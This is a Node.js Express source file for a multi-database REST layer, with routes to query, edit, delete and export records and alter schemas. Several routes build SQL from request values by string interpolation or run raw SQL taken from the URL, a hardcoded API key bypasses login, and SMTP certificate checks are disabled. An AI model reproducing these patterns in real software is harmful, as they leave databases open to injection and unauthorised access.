/*!
 * Copyright (c) 2023 Mediasoft & Cie S.A.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

const OdbcDatabase = require("./OdbcDatabase.js");
const MySqlDatabase = require("./MySqlDatabase.js");
const PrismaDatabase = require("./PrismaDatabase.js");
const VALID_API_KEY = "e7f4b0f3-5c6b-4a29-b821-93f0d99d1cb6";
class dblayer {


  dbList = [];
  databases = [];
  dbCache = [];

  checkAuthenticated = (req, res, next) => {
    const apiKey = req.headers["api_key"]; // ou req.get("api_key")

    // ✅ Si une clé API valide est fournie → autoriser l'accès
    if (apiKey && apiKey === VALID_API_KEY) {
      console.log("🔐 Accès autorisé via API key");
      return next();
    }

    // 🔐 Sinon, vérifie l'authentification standard
    if (req.isAuthenticated && req.isAuthenticated()) {
      return next();
    }

    // ❌ Refusé
    console.warn("⛔ Accès refusé : ni authentifié ni clé API valide");
    res.redirect("/login");
  };


  // for each dns entre create a db object
  constructor(app, session, passport) {
    console.log("dblayer constructor");
    this.dbList = app.config.dblist;
    this.generateRoutes = this.generateRoutes.bind(this);
    this.checkAuthenticated = this.checkAuthenticated.bind(this);

    this.dbtype = app.config.dbtype;
    this.SMTP = app.config.SMTP;
    this.prismaConfig = app.config.prisma || {};
    console.log(this.SMTP);
    // get key value from dblist           
  }

  async init() {
    for (const [key, value] of Object.entries(this.dbList)) {
      console.log(`${key}: ${value}`);
      var DatabaseClass = null;
      switch (this.dbtype) {

        case "mysql":
          this.databases[key] = new MySqlDatabase(value);
          // await this.databases[key].connect();

          this.dbCache[key] = await this.databases[key].getTablesList();
          //  console.log(this.dbCache[key]);
          this.tableToDatabaseMapping = this.createTableDatabaseMapping(this.dbCache);
          // await  this.databases[key].close();
          break;
        case "prisma":
          this.databases[key] = new PrismaDatabase(value, this.prismaConfig);
          this.dbCache[key] = await this.databases[key].getTablesList();
          this.tableToDatabaseMapping = this.createTableDatabaseMapping(this.dbCache);
          break;
        case "odbc":
          this.databases[key] = new OdbcDatabase(value);
          this.dbCache[key] = await this.databases[key].getTablesList();
          //  console.log(this.dbCache[key]);     
          // await  this.databases[key].close();  
          this.tableToDatabaseMapping = this.createTableDatabaseMapping(this.dbCache);
          break;
      }
      // store the db structure in the cache
    }
  }

  // Function to get all table names from a given database cache
  getTableNames(dbCache, dbName) {
    return dbCache[dbName].map(table => table.NAME.toLowerCase());
  }

  async executeActions(actions, details) {
    console.log("executeActions");
    // check if actions is an array
    if (!Array.isArray(actions)) {
      console.log("Actions should be an array");
      return;
    }
    // check if details is an object
    if (typeof details !== 'object' || details === null) {
      console.log("Details should be an object");
      return;
    }
    // check if actions has actionType property
    if (!actions.every(action => action.hasOwnProperty('actionType'))) {
      console.log("Each action should have an actionType property");
      return;
    }
    console.log(actions);
    console.log(actions.actionType);
    actions.forEach(action => {
      switch (action.actionType) {
        case "email":
          console.log("send email notification");
          this.sendEmailNotification(action, details);
          break;
      } // switch (actions.actionType) {
    }); // actions.forEach(action => {
  } // async executeActions(actions, details)


  sendEmailNotification(action, details) {
    console.log("sendEmailNotification");
    // get the SMTP configuration from the app config
    const smtpConfig = this.SMTP;
    console.log("smtpConfig:" + smtpConfig);
    if (smtpConfig) {
      // from actions get the email address
      // send email notification
      var nodemailer = require('nodemailer');

      // Create reusable transporter object
      const transporter = nodemailer.createTransport({
        host: smtpConfig.host,
        port: smtpConfig.port,
        secure: smtpConfig.secure, // false for TLS
        auth: {
          user: smtpConfig.user,
          pass: smtpConfig.pass,
        },
        tls: {
          rejectUnauthorized: false // Optional: useful for debugging TLS issues
        }
      }); // transporter.createTransport({

      // Send mail

      try {
        const email = this.parseEmailText(action.actionContent);
        console.log(email);
        const info = transporter.sendMail({
          from: `"Mediasoft" <${smtpConfig.from}>`,
          to: email.to,
          subject: email.subject,
          html: email.body,
        }); // transporter.sendMail({

        console.log('Email sent:', info.messageId);
      } catch (error) {
        console.error('Error sending email:', error);
      } // transporter.sendMail({


    }// if (!smtpConfig) {

  }

  parseEmailText(text) {
    console.log("parseEmailText");
    console.log(text);
    const toMatch = text.match(/\[to:(.*?)\]/i);
    const subjectMatch = text.match(/\[subjet:(.*?)\]/i); // intentionally matching "subjet"
    const body = text
      .replace(/\[to:.*?\]/i, '')
      .replace(/\[subjet:.*?\]/i, '')
      .trim();

    return {
      to: toMatch ? toMatch[1].trim() : null,
      subject: subjectMatch ? subjectMatch[1].trim() : null,
      body: body || null,
    };
  }

  // Function to generate a mapping of tables to their databases
  createTableDatabaseMapping(dbCache) {
    const mapping = {};

    try {
      for (const [dbName, tables] of Object.entries(dbCache)) {
        for (const table of tables) {
          mapping[table.NAME.toLowerCase()] = dbName;
        }
      }
    } catch (error) {
      console.error("Error creating table to database mapping:", error);
    }

    return mapping;
  }

  // Function to safely convert BigInt to int or string
  convertBigIntToInt(obj) {
    if (Array.isArray(obj)) {
      return obj.map(item => this.convertBigIntToInt(item));
    } else if (obj && typeof obj === 'object') {
      return Object.fromEntries(
        Object.entries(obj).map(([key, value]) => {
          if (typeof value === 'bigint') {
            // Convert to a safe integer if possible, otherwise to a string
            return [key, (value <= Number.MAX_SAFE_INTEGER && value >= Number.MIN_SAFE_INTEGER)
              ? Number(value)
              : value.toString()];
          }
          return [key, value];
        })
      );
    }
    return obj;
  }
  // Function to execute a query on the appropriate database(s)
  async executeQuery(databases, sqlQuery) {
    console.log("executeQuery");
    // check if exist only one database
    console.log(databases.length);
    // extract keys of databases
    const keys = Object.keys(databases);
    console.log(keys[0]);

    if (keys.length === 1) {
      console.log("databases:" + databases[0]);
      const db = databases[keys[0]];

      const result = await db.queryData(sqlQuery);

      return result;
    }


    /*

    const dbRegex = /FROM\s+([A-Z0-9_]+\.[A-Z0-9_]+|[A-Z0-9_]+)/i;
    const dbMatches = new Set();
    let match;

    while ((match = dbRegex.exec(sqlQuery)) !== null) {
      const tableName = match[1].toLowerCase();
      const dbName = this.tableToDatabaseMapping[tableName];
      if (dbName) {
          console.log("dbName:"+dbName);
          dbMatches.add(dbName);
      }
    }

    // Execute the query on a single database or handle external joins
    if (dbMatches.size === 1) {
      const db = [...dbMatches][0];
      console.log("--->db:"+db);
      
      const conn= databases[db];
      if (!conn) {
          throw new Error(`No connection found for database: ${db}`);
      }
    
      await conn.connect();
    //   console.log("sqlQuery:"+sqlQuery);
    //   console.log("db:"+db);
      const result = await conn.queryData(sqlQuery);
      await conn.close();
      return result;
    } else if (dbMatches.size > 1) {
      // Handle external join manually
      const data = {};

      for (const dbName of dbMatches) {
          const query = dbs.adjustQueryForDb(sqlQuery, dbName);
          const conn= databases[dbName];
          await conn.connect();            
          data[dbName] = await conn.queryData(query);
          await conn.close();
      }

      // Assuming JOINs are based on specific logic, you can now merge `data`
      // into the desired joined result here
      return mergeData(data);
    }

    throw new Error('No matching database found for query.');
    */
  }

  // Function to adjust the SQL query for each database (if required)
  adjustQueryForDb(sqlQuery, dbName) {
    // Adjust query logic as needed based on dbName
    return sqlQuery;
  }

  // Example function to merge data from multiple databases (for simplicity, using dummy merging)
  mergeData(data) {
    const mergedData = [];
    for (const dbResults of Object.values(data)) {
      mergedData.push(...(dbResults.rows || []));
    }
    return mergedData;
  }

  generateRoutes(app, dbs) {
    /**
     * @swagger
     * /table-structure/{tableName}:
     *   get:
     *     summary: Get table structure
     *     description: Retrieve the structure of a specified table.
     *     parameters:
     *       - in: path
     *         name: tableName
     *         required: true
     *         description: Name of the table to retrieve structure.
     *         schema:
     *           type: string
     *     responses:
     *       200:
     *         description: Table structure retrieved successfully.
     *       500:
     *         description: Internal Server Error
     */


    app.get('/table-structure/:database/:tableName', dbs.checkAuthenticated, async function (req, res) {
      try {

        const { database, tableName } = req.params;
        console.log("table-structure");
        console.log(database);
        console.log(tableName);
        // console.log(dbs);
        const db = dbs.databases[database];

        db.getTableFields(tableName).then(structure => {
          // Convert BigInt to int or string
          const convertedData = this.convertBigIntToInt(structure);
          res.json(convertedData);
        });

      } catch (err) {
        console.log('Error:', err);
        res.status(500).send('Internal Server Error');
      }
    });

    /**
     * @swagger
     * /tables-list:
     *   get:
     *     summary: Get list of tables
     *     description: Retrieve a list of all tables.
     *     responses:
     *       200:
     *         description: List of tables retrieved successfully.
     *       500:
     *         description: Error retrieving tables list
     */

    app.get('/tables-list', dbs.checkAuthenticated, async (req, res) => {
      console.log("tables-list");
      try {
        var outJson = {};
        //console.log(dbs.dbCache);
        // for each database get the tables list
        for (const [key, value] of Object.entries(dbs.dbCache)) {
          console.log("db:" + key);
          outJson[key] = dbs.dbCache[key];
        }
        res.json(outJson);

      } catch (err) {
        console.log('Error:', err);
        res.status(500).send('Error retrieving tables list');
      }
    });

    /**
     * @swagger
     * /table-fields/{tableName}:
     *   get:
     *     summary: Get fields of a table
     *     description: Retrieve the fields of a specified table.
     *     parameters:
     *       - in: path
     *         name: tableName
     *         required: true
     *         description: Name of the table to retrieve fields.
     *         schema:
     *           type: string
     *     responses:
     *       200:
     *         description: Table fields retrieved successfully.
     *       500:
     *         description: Error retrieving fields for table
     */


    app.get('/table-fields/:database/:tableName', dbs.checkAuthenticated, async (req, res) => {
      try {
        console.log("table-fields");
        const { database, tableName } = req.params;
        const db = dbs.databases[database];

        db.getTableFields(tableName).then(fields => {
          // Convert BigInt to int or string
          const convertedData = this.convertBigIntToInt(fields);
          res.json(convertedData);
        });


      } catch (err) {
        res.status(500).send(`Error retrieving fields for table ${tableName}`);
      }
    });

    /**
     * @swagger
     * /table-indexes/{tableName}:
     *   get:
     *     summary: Get indexes of a table
     *     description: Retrieve the indexes of a specified table.
     *     parameters:
     *       - in: path
     *         name: tableName
     *         required: true
     *         description: Name of the table to retrieve indexes.
     *         schema:
     *           type: string
     *     responses:
     *       200:
     *         description: Table indexes retrieved successfully.
     *       500:
     *         description: Error retrieving indexes for table
     */


    app.get('/table-indexes/:database/:tableName', dbs.checkAuthenticated, async (req, res) => {
      try {
        console.log("table-indexes");
        const { database, tableName } = req.params;
        const db = dbs.databases[database];

        db.getTableIndexes(tableName).then(indexes => {
          // Convert BigInt to int or string
          const convertedData = this.convertBigIntToInt(indexes);
          res.json(convertedData);
        });

      } catch (err) {
        res.status(500).send(`Error retrieving indexes for table ${tableName}`);
      }
    });



    //get record by rowid
    app.get(
      "/get-record-by-rowid/:database/:tableName/:rowID",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName } = req.params;
          const db = dbs.databases[database];


          const rowID = req.params.rowID;
          // Get the fields from the query string. It's a comma-separated string.
          const fields = req.query.fields ? req.query.fields.split(",") : "ROWID";

          db.getRecordByRowID(tableName, fields, rowID).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });


        } catch (err) {
          console.error("Error:", err);
          res.status(500).send({ "Error moving to previous record": err });
        }
      }
    );

    // Get field descriptions
    app.get(
      "/get-field-labels/:database/:tableName",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName } = req.params;
          const db = dbs.databases[database];


          const rowID = req.params.rowID;
          // Get the fields from the query string. It's a comma-separated string.
          const fields = req.query.fields ? req.query.fields.split(",") : "ROWID";

          db.getFieldLabels(tableName, fields).then(data => {
            // Convert BigInt to int or string

            const convertedData = [];
            for (const row of data) {
              // Skip metadata rows
              if (!row["NAME"]) continue;

              const fieldName = row["NAME"].replace(/'/g, ''); // remove single quotes
              const label = row["LABEL"] ? row["LABEL"].replace(/'/g, '') : "(no description)";
              convertedData.push({
                fieldName: fieldName,
                label: label
              });
            }
            res.json(convertedData);
          });

        } catch (err) {
          console.error("Error:", err);
          res.status(500).send({ "Error moving to previous record": err });
        }
      }
    );

    app.get(
      "/get-records-by-indexes/:database/:tableName",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          console.log("get-records-by-idexes");
          const { database, tableName } = req.params;
          const db = dbs.databases[database];

          // convert indexes,values from comma separted into array
          const indexes = req.query.indexes.split(",");
          const values = req.query.values.split(",");
          // Get the fields from the query string. It's a comma-separated string.
          const rowID = req.params.rowID;
          // Get the fields from the query string. It's a comma-separated string.
          const fields = req.query.fields ? req.query.fields.split(",") : "rowid";
          // check if in fields exits the ROWID field add rowID to fields in first position
          if (!fields.includes("rowid")) {
            fields.unshift("rowid");
          }

          // generate the where clause
          const where = indexes.map((index, i) => `"${index}" = '${values[i]}'`).join(" AND ");
          // generate the query with fields and where clause
          const query = `SELECT ${fields} FROM PUB.${tableName} WHERE ${where}`;
          db.queryData(query).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });

        } catch (err) {
          console.error("Error:", err);
          res.status(500).send({ "Error moving to previous record": err });
        }
      }
    );

    /**
     * @swagger
     * /getROWID/{tableName}/{currentRowId}:
     *   get:
     *     summary: Get ROWID of a record in a table
     *     description: Retrieve the ROWID of a record in a specified table based on the current row ID.
     *     parameters:
     *       - in: path
     *         name: tableName
     *         required: true
     *         description: Name of the table.
     *         schema:
     *           type: string
     *       - in: path
     *         name: currentRowId
     *         required: true
     *         description: Current row ID.
     *         schema:
     *           type: string
     *     responses:
     *       200:
     *         description: ROWID retrieved successfully.
     *       500:
     *         description: Error retrieving ROWID.
     */

    app.get(
      "/getROWID/:database/:tableName/:currentRowId",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName } = req.params;
          const db = dbs.databases[database];


          const currentRowId = req.params.currentRowId;
          db.getROWID(tableName, currentRowId).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });

        } catch (err) {
          console.error("Error:", err);
          res.status(500).send({ "Error moving to next record": err });
        }
      }
    );

    /**
     * @swagger
     * /update-record/{tableName}/{rowID}:
     *   put:
     *     summary: Update a record in a table
     *     description: Update a specific record in a table.
     *     parameters:
     *       - in: path
     *         name: tableName
     *         required: true
     *         description: Name of the table where the record is to be updated.
     *         schema:
     *           type: string
     *       - in: path
     *         name: rowID
     *         required: true
     *         description: ID of the record to update.
     *         schema:
     *           type: string
     *     requestBody:
     *       required: true
     *       description: Data to update in the record
     *       content:
     *         application/json:
     *           schema:
     *             type: object
     *             properties:
     *               field1:
     *                 type: string
     *               field2:
     *                 type: string
     *               # Add other fields as required
     *     responses:
     *       200:
     *         description: Record updated successfully.
     *       500:
     *         description: Error updating record.
     */
    app.put(
      "/update-record/:database/:tableName/:rowID",
      dbs.checkAuthenticated,
      async (req, res) => {
        const { database, tableName, rowID } = req.params;
        const db = dbs.databases[database];

        const data = JSON.parse(req.body.data);; // Assuming the updated data is sent in the request body
        const actions = JSON.parse(req.body.actions); // Assuming the action is sent in the request body

        try {

          const result = await db.updateRecord(tableName, data, rowID);
          res.json({ message: "Record updated successfully", result });


          const details = { tableName, data, event: "Update" };
          // Track the action in MongoDB
          await this.executeActions(actions, details);
        } catch (err) {
          console.error(err);
          res.status(500).send({ "Error updating record": err });
        }
      }
    );

    // insert record
    app.post(
      "/insert-record/:database/:tableName",
      dbs.checkAuthenticated,
      async (req, res) => {
        console.log("We insert here ");
        const { database, tableName } = req.params;
        const db = dbs.databases[database];

        const data = JSON.parse(req.body.data); // Assuming the updated data is sent in the request body

        var actions = []; //JSON.parse(req.body.actions); // Assuming the action is sent in the request body
        if (req.body.actions) {
          try {
            actions = JSON.parse(req.body.actions);
          } catch (err) {
            console.log("No actions to execute");
          }
        }

        try {

          const result = await db.insertRecord(tableName, data);
          res.json({ message: "Record inserted successfully", result });


          const details = { tableName, data, event: "Insert" };
          // Track the action in MongoDB
          await this.executeActions(actions, details);
        } catch (err) {
          console.error(err);
          res.status(500).send({ "Error inserting record": err });
        }
      }
    );


    app.post(
      "/delete-record/:dbName/:tableName/:rowId",
      dbs.checkAuthenticated,
      async (req, res) => {
        console.log("We delete here ");
        const { dbName, tableName, rowId } = req.params;
        const db = dbs.databases[dbName];

        const actions = JSON.parse(req.body.actions); // Assuming the action is sent in the request body

        console.log("db object methods:", Object.keys(db));

        try {

          const sql = `DELETE FROM PUB."${tableName}" WHERE rowid = ?`;
          const result = await db.deleteRecord(sql, [rowId]);

          res.json({ message: "Record deleted successfully", result });


          const details = { tableName, event: "Delete" };
          // Track the action in MongoDB
          await this.executeActions(actions, details);
        } catch (err) {
          console.error(err);
          res.status(500).send({ "Error deleting record": err });
        }
      }
    );
    /*
    // delete record
    app.post('/delete-record/:dbName/:tableName/:rowId', async (req, res) => {
      const { dbName, tableName, rowId } = req.params;
      const { actions } = req.body;
    
      try {
        const result = await deleteRecordFromDB(dbName, tableName, rowId, actions);
        if (result.success) {
          res.status(200).json({ success: true });
        } else {
          res.status(500).json({ success: false, message: "Failed to delete record" });
        }
      } catch (error) {
        console.error("Error deleting record:", error);
        res.status(500).json({ success: false, message: "Internal Server Error" });
      }
    });
    // debug delete record
    app.post(
      '/delete-record/:dbName/:tableName/:rowId',
      dbs.checkAuthenticated,
      async (req, res) => {
        const { dbName, tableName, rowId } = req.params;
        const db = dbs.databases[dbName];
        console.log("db object methods:", Object.keys(db));
        const { actions } = req.body;
    
        console.log('DELETE request handler called');
        console.log({ dbName, tableName, actions });
        
        try {
          const condition = `rowid = '${rowId}'`; // assuming rowid is your primary key field
          const result = await db.deleteRecord(tableName, condition);
          console.log('deleteRecord result:', result);
          
          if (result.success) {
            res.json({ success: true });
          } else {
            res.status(500).json({ success: false });
        }
      } catch (error) {
        console.error('Error in delete-record route:', error);
        res.status(500).json({ success: false, message: error.message });
      }
    });
    */




    //GRID
    app.get(
      "/table-data/:database/:tableName/:page/:pageSize",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {

          const { database, tableName, page, pageSize } = req.params;
          const db = dbs.databases[database];


          // Convert page and pageSize to numbers
          const pageNum = parseInt(page, 10);
          const pageSizeNum = parseInt(pageSize, 10);

          // Get the fields from the query string. It's a comma-separated string.
          const fields = req.query.fields ? req.query.fields.split(",") : null;
          const filter = req.query.filter ? req.query.filter : null;
          const orderBy = req.query.orderBy ? req.query.orderBy : null;
          // decode the json filter              
          const filterObj = filter ? JSON.parse(filter) : null;
          const orderByObj = orderBy ? JSON.parse(orderBy) : null;
          // orderby generation 

          db.queryDataWithPagination(
            tableName,
            pageNum,
            pageSizeNum,
            fields,
            filterObj,
            orderByObj
          ).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });


        } catch (err) {
          console.error("Error:", err);
          res.status(500).send({ "Error fetching paginated data": err });
        }
      }
    );
    //GRID
    app.get(
      "/table-data-sql/:database/:page/:pageSize",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, page, pageSize } = req.params;
          var sqlQuery = req.query.sqlQuery;
          const db = dbs.databases[database];


          // Convert page and pageSize to numbers
          const pageNum = parseInt(page);
          const pageSizeNum = parseInt(pageSize);
          const offset = (pageNum - 1) * pageSizeNum;
          const filter = req.query.filter ? req.query.filter : null;

          // decode the json filter              
          const filterObj = filter ? JSON.parse(filter) : null;
          // add limit to the query
          const limit = req.query.limit ? req.query.limit : null;

          sqlQuery += ` OFFSET ${offset} ROWS FETCH NEXT ${pageSizeNum} ROWS ONLY`;

          // get data from the query
          db.queryData(sqlQuery).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });

        } catch (err) {
          console.error("Error:", err);
          res.status(500).send({ "Error fetching paginated data": err });
        }
      }
    );

    //Schema modification
    //Alter table
    app.post("/alter-table/:database/:tableName", dbs.checkAuthenticated, async (req, res) => {
      try {
        const { database, tableName } = req.params;
        const db = dbs.databases[database];


        const { action, columnName, columnType, newColumnName, newColumnType } =
          req.body;

        let result;
        if (action === "add") {
          result = await db.alterTable(tableName, columnName, columnType);
        } else if (action === "modify") {
          result = await db.alterTableColumn(
            tableName,
            columnName,
            newColumnName,
            newColumnType
          );
        } else {
          throw new Error("Invalid action");
        }

        res.json({ message: "Table altered successfully", result });

      } catch (err) {
        console.error(err);
        res.status(500).send({ "Error altering table": err });
      }
    });
    //Create table
    app.post("/create-table/:database/:tableName", dbs.checkAuthenticated, async (req, res) => {
      try {
        const { database, tableName } = req.params;
        const db = dbs.databases[database];

        const columns = req.body.columns;
        const result = await db.createTable(tableName, columns);
        res.json({ message: "Table created successfully", result });

      } catch (err) {
        console.error(err);
        res.status(500).send({ "Error creating table": err });
      }
    });

    function decodeSpecialChars(data) {
      // replace %20 by space
      data = data
        .replaceAll("%20", " ")
        .replaceAll("%27", "'")
        .replaceAll("%2C", ",")
        .replaceAll("%3A", ":")
        .replaceAll("%3B", ";")
        .replaceAll("%3D", "=")
        .replaceAll("%3F", "?")
        .replaceAll("%40", "@");

      return data;
    }

    //select distinct values for a field
    app.get(
      "/select-distinct/:database/:tableName/:fieldName",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName, fieldName } = req.params;
          const db = dbs.databases[database];


          // convert html code to special characters

          const filter = req.query.filter
            ? decodeSpecialChars(req.query.filter)
            : null;

          db.selectDistinct(tableName, fieldName, filter).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });


        } catch (err) {
          console.error(err);
          res.status(500).send({ "Error selecting distinct values": err });
        }
      }
    );

    //select distinct values for a field
    app.get(
      "/select-distinct-idvalue/:database/:tableName/:fieldName",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName, fieldName } = req.params;
          // delete duplicate values in fieldName

          const db = dbs.databases[database];


          // convert html code to special characters
          const fieldid = req.query.id;
          const filter = req.query.filter
            ? decodeSpecialChars(req.query.filter)
            : null;

          db.selectDistinctIdValue(
            tableName,
            fieldid,
            fieldName,
            filter
          ).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          });

        } catch (err) {
          console.error(err);
          res.status(500).send({ "Error selecting distinct values": err });
        }
      }
    );

    // export table to csv
    // set html mime type in header
    app.get("/export-table/:database/:tableName", dbs.checkAuthenticated, async (req, res) => {
      try {
        const { database, tableName } = req.params;
        const db = dbs.databases[database];

        const fields = req.query.fields ? req.query.fields.split(",") : null;
        const result = await db.exportTableToCSV(tableName, fields);
        // res set header
        res.set("Content-Type", "text/csv");
        res.set("Content-Disposition", `attachment; filename=${tableName}.csv`);
        res.status(200).send(result);

      } catch (err) {
        console.error(err);
        res.status(500).send("Error exporting table");
      }
    });

    // select distinct values for a field selectDistinct(tableName, columnName, filter)
    app.get(
      "/get-distinct-data/:database/:tableName",
      dbs.checkAuthenticated,
      async (req, res) => {
        try {
          const { database, tableName } = req.params;
          const db = dbs.databases[database];

          const fields = req.query.fields ? req.query.fields.split(",") : null;
          const filter = req.query.filter ? req.query.filter : null;
          db.selectDistinct(tableName, fields, filter).then(data => {
            // Convert BigInt to int or string
            const convertedData = this.convertBigIntToInt(data);
            res.json(convertedData);
          }
          );
        } catch (err) {
          console.error(err);
          res.status(500).send("Error selecting data");
        }
      }
    );

    // get count of records in a table with selectDistinct
    app.get("/get-count/:database/:tableName", dbs.checkAuthenticated, async (req, res) => {
      try {
        // connect to database
        const { database, tableName } = req.params;
        const db = dbs.databases[database];


        // filter
        const filter = req.query.filter ? req.query.filter : null;
        db.count(tableName, filter).then(data => {
          // Convert BigInt to int or string
          const convertedData = this.convertBigIntToInt(data);
          res.json(convertedData);
        }
        );

      } catch (err) {
        console.error(err);
        res.status(500).send("Error selecting count");
      }
    });

    // get dataset data by dataset name and filter
    app.post('/getDatasetDataByFilter', dbs.checkAuthenticated, async (req, res) => {
      console.log("getDatasetDataByFilter");

      try {


        //if req.body is not defined, set it to an empty object
        const filters = req.body.filters.filters || [];
        // if req.body.view is not defined, set it to empty string
        const view = req.body.view || '';
        // if req.body.columns is not defined, set it to an empty array
        const columns = req.body.columns || [];
        // if req.body.pivot is not defined, set it to an empty array
        const pivot = req.body.pivot || [];
        // get groups from req.body.groups
        const groups = req.body.groups || '';

        // check if in the colums exits the limit field
        const limit = req.body.limit
        // if limit not exits set it to 1000
        const limitValue = limit ? limit.value : 100;
        // check if in the colums exits the sort field
        const sort = req.body.sort;
        // check if in the colums exits the direction field
        const links = req.body.links;
        if (sort) {
          var direction = sort.direction;
          var sortfield = sort.field;
        }
        console.log("filterDocuments");
        // get all the results by
        var results = await filterDocuments(view, filters, columns, groups, sortfield, direction, limitValue);


        // get all the results by 
        if (pivot.length > 0) {
          // get pivot years
          console.log("pivot data");
          pFields = pivot.map(p => p.fieldName);
          console.log(pFields);
          pColumns = columns.map(p => p.fieldName);
          console.log(pColumns);
          results = pivotData(results, pColumns, pFields);
          //  console.log(results);
        }
        // limit the results
        if (limitValue) {
          results = results.slice(0, limitValue);
        }
        res.status(200).json(results);

      } catch (err) {
        res.status(500).send({ error: err.message });
      }
    });


    // get dataset data by dataset name and filter
    function flattenJSON(data, columns) {
      const results = [];
      for (let i = 0; i < data.length; i++) {
        const obj = {};
        for (const key in data[i]) {
          if (!Array.isArray(data[i][key])) {
            obj[key] = data[i][key];
          } else {
            // for each value in the array
            for (let j = 0; j < data[i][key].length; j++) {
              //  the sub object
              const subObj = {};
              // add obj key,value to subObj
              for (const key1 in obj) {
                subObj[key1] = obj[key1];
              }
              for (const key1 in data[i][key][j]) {
                // if key1 exists in subObj, not add it
                if (key1 in subObj) {
                  continue;
                }
                subObj[key1] = data[i][key][j][key1];
              }
              results.push(subObj);
            }
          }
        }
        //  results.push(obj);

      }

      return results;
    }
    // Function to get data from a view

    async function filterDocuments(view, filters, columns, groups, sort, direction, limitValue) {
      // generate the query string with columns columns fieldName and columns DBname colums dataset = table name
      // generate query with columns function, fieldname
      // split the groups by |



      let query = "SELECT ";
      columns.forEach((column, index) => {
        switch (column.functionName) {
          case "count":
            query += ` COUNT(*) AS "${column.fieldLabel}" ,`;
            break;
          case "value":
            query += ` ${column.fieldName} AS "${column.fieldLabel}" ,`;
            break;
          default:
            query += ` ${column.functionName}(${column.fieldName}) AS "${column.fieldLabel}" ,`;
            break;
        }


      });
      // add the aggregate function
      query += ` ${groups.fieldName} AS "${groups.fieldLabel}" `;
      query += ` FROM PUB.${groups.tableName}`;

      // check if filters is not empty
      if (filters.length > 0) {
        query += " WHERE ";
        filters.forEach((filter, index) => {
          // check if filter is not empty
          // apply the fieldName = value
          if (filter.fieldName && filter.value) {
            // check if filter is not empty
            if (filter.value !== "") {
              // check if filter is not empty
              switch (filter.operator) {
                case "like":
                  query += ` ${filter.fieldName} LIKE '%${filter.value}%' `;
                  break;
                default:
                  query += ` ${filter.fieldName} = '${filter.value}' `;
                  break;
              } // switch
            } // if (filter.value !== "")
          } // if (filter.fieldName && filter.value)
        }) // forEach
      }
      // check if filter is not empty 

      query += ` GROUP BY ${groups.fieldName} `;

      // check limit value
      if (!limitValue || limitValue === undefined) {
        limitValue = 100;
      }

      query += ` FETCH FIRST ${limitValue} ROWS ONLY`;
      console.log("query:" + query);

      // Connect to the database
      const db = dbs.databases[groups.DBName];

      // Execute the query
      const data = await db.queryData(query);




      // return the data
      return data;
    }



    // Function to convert the operator to MongoDB operator
    function convertOperator(operator) {
      switch (operator) {
        case '=':
          return '$eq';
        case '!=':
          return '$ne';
        case '>':
          return '$gt';
        case '>=':
          return '$gte';
        case '<':
          return '$lt';
        case '<=':
          return '$lte';
        case 'in':
          return '$in';
        case 'not in':
          return '$nin';
        case 'like':
          return '$regex';
        default:
          return '$eq';
      }
    }




    // Function to filter documents in a collection

    function pivotData(data, columnFields, pivotFields) {
      console.log("pivotData");

      const pivotData = [];
      const result = [];

      // Get all the distinct values of the first pivot field
      const pivotValues = Array.from(new Set(data.map(item => item[pivotFields[0]])));
      console.log(pivotValues);

      // Group data by the distinct values of the first pivot field
      data.forEach(item => {

        pivotValues.forEach(value => {
          if (item[pivotFields[0]] === value) {
            item[value] = item[pivotFields[1]];
          }
          else {
            item[value] = 0;
          }
        });
        pivotFields.forEach(field => {
          delete item[field];
        });
        // delete _id field
        if (item._id) {
          delete item._id;
        }
        result.push(item);
      });

      return result;
    }

    // app.get("/next-sequence", dbs.checkAuthenticated, async (req, res) => {
    //   try {
    //     console.log("step three is call");
    //    
    //     const sequence = await db.nextSequence();
    //     console.log(sequence);
    //     console.log("result Above");
    //     res.json(sequence);
    //   } catch (err) {
    //     res.status(500).send(`Error retrieving fields for table }`);
    //   } finally {
    //     
    //   }
    // });
    function convertBigIntToString(obj) {
      if (obj === null || obj === undefined) return obj;
      if (typeof obj === "bigint") return obj.toString();
      if (typeof obj === "object") {
        if (Array.isArray(obj)) {
          return obj.map((item) => convertBigIntToString(item));
        } else {
          const result = {};
          for (const [key, value] of Object.entries(obj)) {
            result[key] = convertBigIntToString(value);
          }
          return result;
        }
      }
      return obj;
    }

    app.get("/next-sequence/:database/:table/:seq", dbs.checkAuthenticated, async (req, res) => {
      try {
        const { database, table, seq } = req.params;
        console.log("Step three is called");
        const db = dbs.databases[database];


        db.nextSequence(table, seq).then(sequence => {
          // Convert BigInt to int or string
          const convertedData = convertBigIntToString(sequence);
          res.json(convertedData);
        }
        );


      } catch (err) {
        console.error("Error retrieving sequence:", err);
        res.status(500).json({ error: "Error retrieving fields for the table" });
      }
    });

    // call queryData
    app.get("/query-data/:database/:sqlQuery", dbs.checkAuthenticated, async (req, res) => {
      try {
        const { database, sqlQuery } = req.params;
        const db = dbs.databases[database];

        db.queryData(sqlQuery).then(result => {
          // Convert BigInt to int or string
